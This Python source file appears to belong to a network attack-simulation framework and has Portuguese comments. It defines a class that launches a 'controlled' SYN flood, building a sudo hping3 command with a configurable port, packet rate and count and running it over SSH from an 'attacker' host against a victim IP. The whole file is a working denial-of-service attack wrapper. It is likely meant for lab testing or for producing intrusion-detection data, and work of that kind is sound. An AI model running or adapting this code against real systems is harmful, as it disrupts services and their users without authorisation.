import logging
logger = logging.getLogger("[Action:Hping3SYN]")

class Hping3SynFloodAction:
    """
    SYN flood controlado.
    Params (YAML): dst_port, rate_pps, duration_s, count, quiet
    Workload["syn"]: { dst_port, rate_pps, duration_s, count }
    """
    def __init__(self, dst_port=80, rate_pps=500, duration_s=60, count=None, quiet=True, **kwargs):
        self.dst_port = int(dst_port)
        self.rate_pps = max(1, int(rate_pps))
        self.duration_s = max(1, int(duration_s))
        self.count = int(count) if count is not None else None
        self.quiet = bool(quiet)
        self._extra = kwargs

    def run(self, attacker_ssh, victim_ip: str, workload=None, **kwargs):
        syn_cfg = (workload or {}).get("syn", {}) if workload else {}
        dst_port = int(syn_cfg.get("dst_port", self.dst_port))
        rate_pps = max(1, int(syn_cfg.get("rate_pps", self.rate_pps)))
        duration_s = max(1, int(syn_cfg.get("duration_s", self.duration_s)))
        count = int(syn_cfg["count"]) if syn_cfg.get("count") is not None else self.count

        try:
            total = count if count is not None else rate_pps * duration_s
            micros = max(1, int(1_000_000 / rate_pps))
            flags = "-q" if self.quiet else ""
            cmd = (
                f"bash -lc \"IP={victim_ip}; sudo hping3 -S -p {dst_port} -i u{micros} -c {total} {flags} $IP\""
            )
            logger.info(f"[Hping3SYN] dst_port={dst_port} rate_pps={rate_pps} dur={duration_s}s total={total}")
            attacker_ssh.run_command("attacker", cmd, timeout=duration_s + 120)
        except Exception as e:
            logger.error(f"[Hping3SYN] Falhou: {e}")
            raise
